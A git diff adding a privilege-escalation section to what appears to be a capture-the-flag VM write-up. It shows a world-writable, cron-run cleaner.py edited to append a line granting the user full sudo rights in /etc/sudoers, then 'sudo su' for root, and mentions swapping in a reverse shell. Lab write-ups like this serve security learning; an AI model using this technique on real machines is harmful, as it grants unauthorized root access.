@@ -122,7 +122,40 @@ ssh overflow@192.168.114.134
 Password: Pass.txt
 ```
 
+# Local Privilege Escalation
 
+```
+[+] World Writable Files
+    -rwxrwxrwx 1 troll root 8068 Aug 10  2014 /srv/ftp/lol.pcap
+    -rwxrwxrwx 1 root root 34 Aug 13  2014 /var/tmp/cleaner.py.swp
+    -rwxrwxrwx 1 root root 7296 Aug 11  2014 /var/www/html/sup3rs3cr3tdirlol/roflmao
+    -rwxrwxrwx 1 root root 23 Aug 13  2014 /var/log/cronlog
+    -rwxrwxrwx 1 root root 96 Aug 13  2014 /lib/log/cleaner.py
+```
+```
+cat /var/log/cronlog
+```
+It runs cleaner.py periodically
+```
+cat /lib/log/cleaner.py
+#!/usr/bin/env python
+import os
+import sys
+try:
+	os.system('rm -r /tmp/* ')
+except:
+	sys.exit()
+```
+Simple program to delete files in tmp.
+Fortunately it has world write. Therefore instead we can edit the file and use os.system to give us root. OR we can replace the file with a reverse python shell, and make sure the name is cleaner.py
+```
+	os.system('echo "overflow ALL=(ALL:ALL) ALL" >> /etc/sudoers ')
+```
+This gives overflow sudo privileges. 
+Wait...
+```
+sudo su  <- gives me root
+```
 
 
 
